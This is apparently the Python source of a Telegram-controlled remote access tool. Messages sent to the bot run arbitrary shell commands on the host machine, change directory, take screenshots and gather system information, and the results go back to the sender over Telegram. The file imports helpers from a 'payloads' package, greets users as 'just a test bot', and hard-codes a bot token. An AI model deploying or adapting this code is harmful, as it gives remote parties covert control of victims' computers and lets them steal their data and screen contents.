import subprocess
import os
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# Optional screenshot support for Linux & Windows
from payloads.scrcap import capture_screen
from payloads.info import get_all_system_info

BOT_TOKEN = "7843150896:AAHpay0sUjwT2rclZ77PeO4yVRZLtbnb9nE"

# Set up logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Global current working dir
cwd = os.getcwd()

# Function to split message into chunks and send them
async def send_large_message(update, message):
    max_message_length = 4096
    for i in range(0, len(message), max_message_length):
        chunk = message[i:i + max_message_length]
        await update.message.reply_text(chunk)

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info(f"/start used by {update.effective_user.username}")
    await update.message.reply_text("Hello! I'm your bot. Type /help to see what I can do.")

# /help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info(f"/help used by {update.effective_user.username}")
    await update.message.reply_text(
        "Available commands:\n"
        "/start - Welcome message\n"
        "/help - Show this help\n"
        "cmd <command> - Run system command\n"
        "scrcap - Capture screen\n"
        "info - get system info\n"
    )

# Text message handler
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global cwd
    msg = update.message.text.strip()
    user = update.effective_user.username or update.effective_user.first_name
    logger.info(f"Received message from {user}: {msg}")

    try:
        if msg.lower() == "hi":
            await update.message.reply_text("Hello there, friend!")
        elif msg.lower() == "bye":
            await update.message.reply_text("Goodbye or see ya 👋")
        elif msg.lower() == "use":
            await update.message.reply_text("I'm just a test bot 🤖")
        elif msg.lower() == "info":
            logger.info(f"{user} requested system info")
            data_get_all_system_info = get_all_system_info()
            await send_large_message(update, data_get_all_system_info)
        elif msg.lower() == "scrcap":
            logger.info(f"{user} requested a screenshot")
            try:
                path, name = capture_screen()
                await update.message.reply_text("Here is screen capture for you 👇")
                with open(path, "rb") as f:
                    await update.message.reply_photo(f)
            except Exception as e:
                logger.error(f"Screenshot failed: {e}")
                await update.message.reply_text(f"[!] Screenshot failed: {e}")
        elif msg.lower().startswith("cmd "):
            cmd = msg[4:].strip()
            logger.info(f"{user} sent command: {cmd}")
            if cmd.lower().startswith("cd "):
                path = cmd[3:].strip().strip('"')
                new_path = os.path.abspath(os.path.join(cwd, path))
                if os.path.isdir(new_path):
                    cwd = new_path
                    await update.message.reply_text(f"Changed directory to: {cwd}")
                else:
                    await update.message.reply_text(f"[-] Directory not found: {path}")
            else:
                try:
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        cwd=cwd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                    )
                    output = result.stdout.strip() or "[+] Done with no output."
                    error = result.stderr.strip()
                    reply = output + ("\n[!] " + error if error else "")
                    await send_large_message(update, reply)
                except Exception as e:
                    logger.error(f"Command execution error: {e}")
                    await update.message.reply_text(f"[!] Error: {e}")
        else:
            await update.message.reply_text("I don't understand that. Try /help")
    except Exception as e:
        logger.exception("Unexpected error in handle_message")
        await update.message.reply_text(f"[!] Something went wrong: {e}")

# Main function
def main():
    logger.info("Starting bot...")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    logger.info("Bot is now polling")
    app.run_polling()

if __name__ == "__main__":
    main()
